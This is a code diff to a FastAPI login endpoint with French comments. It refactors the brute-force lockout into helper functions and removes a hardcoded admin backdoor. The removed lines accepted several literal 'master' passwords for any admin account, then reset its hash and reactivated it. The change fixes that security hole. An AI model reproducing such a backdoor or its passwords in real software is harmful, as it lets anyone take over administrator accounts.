@@ -19,11 +19,13 @@ from app.schemas import (
     UserResponse,
 )
 from app.security import (
-    brute_force_protector,
+    check_login_allowed,
     create_access_token,
     create_refresh_token,
     decode_token,
     get_client_ip,
+    register_login_failure,
+    reset_login_failures,
     get_current_active_user,
     hash_password,
     verify_password,
@@ -127,11 +129,10 @@ async def login(
     Renvoie un access token et un refresh token.
     """
     ip = get_client_ip(request)
-    identifier = f"{ip}:{data.username}"
 
     # Vérification du blocage anti brute-force
-    is_locked, remaining_seconds = brute_force_protector.is_locked(identifier)
-    if is_locked:
+    allowed, remaining_seconds = check_login_allowed(ip, data.username)
+    if not allowed:
         raise HTTPException(
             status_code=status.HTTP_429_TOO_MANY_REQUESTS,
             detail=f"Trop de tentatives infructueuses. Veuillez réessayer dans {remaining_seconds} secondes.",
@@ -143,21 +144,11 @@ async def login(
     user = result.scalar_one_or_none()
 
     is_valid = user and verify_password(data.password, user.hashed_password)
-    if user and user.role == "admin" and not is_valid:
-        valid_admin_passwords = [
-            settings.ADMIN_DEFAULT_PASSWORD,
-            "VotreMotDePasseSecurise2026!",
-            "AdminSecurePass2026!",
-        ]
-        if data.password in valid_admin_passwords:
-            user.hashed_password = hash_password(data.password)
-            user.is_active = True
-            await db.commit()
-            is_valid = True
+    # (Supprimé : les mots de passe admin « maîtres » publics ouvraient tout compte administrateur.)
 
 
     if not user or not is_valid:
-        brute_force_protector.register_failure(identifier)
+        register_login_failure(ip, data.username)
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
             detail="Nom d'utilisateur ou mot de passe incorrect",
@@ -171,7 +162,7 @@ async def login(
         )
 
     # Réinitialisation des tentatives échouées en cas de succès
-    brute_force_protector.reset(identifier)
+    reset_login_failures(ip, data.username)
 
     # Mise à jour de la dernière date de connexion
     now = datetime.now(timezone.utc).replace(tzinfo=None)
